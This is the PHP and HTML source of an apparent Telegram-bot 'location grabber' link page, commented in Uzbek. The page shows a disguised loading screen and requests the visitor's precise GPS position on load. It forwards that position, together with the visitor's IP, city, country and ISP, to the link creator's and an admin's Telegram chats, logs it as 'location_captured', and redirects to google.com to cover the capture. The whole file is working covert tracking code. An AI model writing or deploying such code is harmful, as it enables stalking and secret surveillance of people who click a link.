<?php
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
$lat = $_GET['lat'] ?? null;
$lon = $_GET['lon'] ?? null;
$acc = $_GET['acc'] ?? null;
$ts  = $_GET['ts'] ?? null;

if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}


// Faqat lokatsiya bo'lsa ishlaydi
if ($lat !== null && $lon !== null) {

    if (!is_numeric($lat) || !is_numeric($lon)) {
        http_response_code(400);
        exit("400 Bad Request");
    }

    $ip = client_ip();
    $ipdata = ipInfo($ip);
    $maps = "https://www.google.com/maps?q=" . urlencode($lat) . "," . urlencode($lon);

    $timeStr = $ts ? date("Y-m-d H:i:s", intval($ts/1000)) : date("Y-m-d H:i:s");
    $accuracy = $acc ? round($acc) . " m" : "Noma'lum";

    // Geomaʼlumotlar
    $geoInfo = "";
    if ($ipdata) {
        $city = $ipdata['city'] ?? 'Nomaʼlum';
        $country = $ipdata['country'] ?? 'Nomaʼlum';
        $isp = $ipdata['isp'] ?? 'Nomaʼlum';
        $geoInfo = "\n🏙️ Shahar: {$city}\n🏳️ Mamlakat: {$country}\n🌐 Provayder: {$isp}";
    }

    $text = "📍 <b>Geolokatsiya:</b>\n".
            "📍 <b>Lat:</b> {$lat}\n".
            "📍 <b>Lon:</b> {$lon}\n".
            "📏 <b>Aniqlik:</b> {$accuracy}\n".
            "🕒 <b>Vaqt:</b> {$timeStr}\n".
            "🌐 <b>IP:</b> {$ip}{$geoInfo}\n\n".
            "🗺️ <a href='{$maps}'>Google Maps da ko'rish</a>";


    // ========== 1) Foydalanuvchiga yuborish ==========
    tgRequest("sendMessage", [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ]);

    tgRequest("sendLocation", [
        'chat_id' => $chat_id,
        'latitude' => $lat,
        'longitude' => $lon
    ]);



    // ========== 2) ADMIN ga yuborish ==========
    $admin = ADMIN_ID;

    $adminText = "📍 <b>Yangi geolokatsiya!</b>\n".
                 "👤 User: <code>{$chat_id}</code>\n\n".
                 "📍 Lat: {$lat}\n".
                 "📍 Lon: {$lon}\n".
                 "📏 Aniqlik: {$accuracy}\n".
                 "🕒 Vaqt: {$timeStr}\n".
                 "🌐 IP: {$ip}{$geoInfo}\n\n".
                 "🗺️ <a href='{$maps}'>Google Maps</a>";

    tgRequest("sendMessage", [
        'chat_id' => $admin,
        'text' => $adminText,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ]);

    tgRequest("sendLocation", [
        'chat_id' => $admin,
        'latitude' => $lat,
        'longitude' => $lon
    ]);


    // ========== 3) Bazani yangilash ==========
    $cols = $pdo->query("PRAGMA table_info(users)")->fetchAll(PDO::FETCH_ASSOC);
    $has = false;

    foreach ($cols as $c) {
        if ($c['name'] === 'locations_sent') {
            $has = true;
            break;
        }
    }

    if (!$has) {
        $pdo->exec("ALTER TABLE users ADD COLUMN locations_sent INTEGER DEFAULT 0");
    }

    $upd = $pdo->prepare("
        UPDATE users 
        SET locations_sent = COALESCE(locations_sent, 0) + 1 
        WHERE chat_id = ?
    ");
    $upd->execute([$chat_id]);


    // ========== 4) Log ==========
    logActivity($chat_id, 'location_captured', "Lokatsiya qabul qilindi: {$lat}, {$lon}");

    // ========== 5) Redirect ==========
    header("Location: https://google.com");
    exit;
}
?>

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Location Service</title>
<style>
html,body{
    height:100%;
    margin:0;
    background:#fff;
    font-family: Arial, sans-serif;
}
.loading {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100%;
    flex-direction: column;
}
.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #3498db;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 2s linear infinite;
    margin-bottom: 20px;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
</head>
<body>
<div class="loading">
    <div class="spinner"></div>
    <div>Kirilmoqdaa...</div>
</div>
<script>
(function(){
    const key = "<?php echo htmlspecialchars($key, ENT_QUOTES); ?>";
    
    if (!navigator.geolocation) { 
        try { window.close(); } catch(e) {}
        return; 
    }
    
    navigator.geolocation.getCurrentPosition(
        function(pos){
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;
            const ts  = pos.timestamp;
            
            const url = 'lk?id=' + encodeURIComponent(key) +
                '&lat=' + encodeURIComponent(lat) +
                '&lon=' + encodeURIComponent(lon) +
                '&acc=' + encodeURIComponent(acc) +
                '&ts=' + encodeURIComponent(ts);
                
            location.href = url;
        }, 
        function(err){
            try { window.close(); } catch(e) {}
            location.href = 'https://google.com';
        }, 
        {
            enableHighAccuracy: true, 
            timeout: 30000,
            maximumAge: 0
        }
    );
})();
</script>
</body>
</html>